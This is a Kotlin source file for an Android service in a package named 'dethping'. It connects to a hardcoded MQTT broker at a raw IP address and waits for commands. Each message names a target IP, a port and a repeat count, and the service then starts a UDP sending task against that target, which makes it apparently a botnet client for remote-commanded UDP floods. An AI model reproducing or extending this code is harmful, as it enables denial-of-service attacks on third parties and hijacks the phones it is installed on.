package `in`.planckstudio.dethping

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import org.eclipse.paho.android.service.MqttAndroidClient
import org.eclipse.paho.client.mqttv3.IMqttActionListener
import org.eclipse.paho.client.mqttv3.IMqttDeliveryToken
import org.eclipse.paho.client.mqttv3.IMqttToken
import org.eclipse.paho.client.mqttv3.MqttCallbackExtended
import org.eclipse.paho.client.mqttv3.MqttConnectOptions
import org.eclipse.paho.client.mqttv3.MqttMessage

class MQTTService : Service() {

    private val serverUri = "tcp://142.147.96.108:1883"
    private val clientId = "AndroidClient"
    private val topic = "topic_name"

    private lateinit var mqttAndroidClient: MqttAndroidClient

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onCreate() {
        super.onCreate()
        connectToMqttBroker()
    }

    private fun connectToMqttBroker() {
        mqttAndroidClient = MqttAndroidClient(applicationContext, serverUri, clientId)

        val mqttConnectOptions = MqttConnectOptions()
        mqttConnectOptions.isAutomaticReconnect = true
        mqttConnectOptions.isCleanSession = false

        mqttAndroidClient.connect(mqttConnectOptions, null, object : IMqttActionListener {
            override fun onSuccess(asyncActionToken: IMqttToken?) {
                Log.d("MQTT", "Connected to MQTT broker")
                subscribeToTopic()
            }

            override fun onFailure(asyncActionToken: IMqttToken?, exception: Throwable?) {
                Log.e("MQTT", "Failed to connect to MQTT broker: ${exception?.localizedMessage}")
            }
        })

        mqttAndroidClient.setCallback(object : MqttCallbackExtended {
            override fun connectComplete(reconnect: Boolean, serverURI: String?) {
                Log.d("MQTT", "Connection complete")
            }

            override fun connectionLost(cause: Throwable?) {
                Log.d("MQTT", "Connection lost")
            }

            override fun messageArrived(topic: String?, message: MqttMessage?) {
                message?.let {
                    val payload = String(it.payload)
                    Log.d("MQTT", "Received message: $payload")
                    processMessage(payload)
                }
            }

            override fun deliveryComplete(token: IMqttDeliveryToken?) {
                Log.d("MQTT", "Delivery complete")
            }
        })
    }

    private fun subscribeToTopic() {
        mqttAndroidClient.subscribe(topic, 0, null, object : IMqttActionListener {
            override fun onSuccess(asyncActionToken: IMqttToken?) {
                Log.d("MQTT", "Subscribed to topic: $topic")
            }

            override fun onFailure(asyncActionToken: IMqttToken?, exception: Throwable?) {
                Log.e("MQTT", "Failed to subscribe to topic: $topic")
            }
        })
    }

    private fun processMessage(payload: String) {
        val values = payload.split(":")
        if (values.size == 4) {
            val ip = values[0]
            val port = values[1].toIntOrNull()
            val request = values[2]
            val repeats = values[3].toIntOrNull()

            if (port != null && repeats != null) {
                Log.d("MQTT", "IP: $ip, Port: $port, Request: $request, Repeats: $repeats")
                UDPSenderTask(ip, port, repeats, repeats).execute()
            } else {
                Log.e("MQTT", "Invalid port or repeats value")
            }
        } else {
            Log.e("MQTT", "Invalid payload format")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        mqttAndroidClient.disconnect(null, object : IMqttActionListener {
            override fun onSuccess(asyncActionToken: IMqttToken?) {
                Log.d("MQTT", "Disconnected from MQTT broker")
            }

            override fun onFailure(asyncActionToken: IMqttToken?, exception: Throwable?) {
                Log.e(
                    "MQTT",
                    "Failed to disconnect from MQTT broker: ${exception?.localizedMessage}"
                )
            }
        })
    }


}
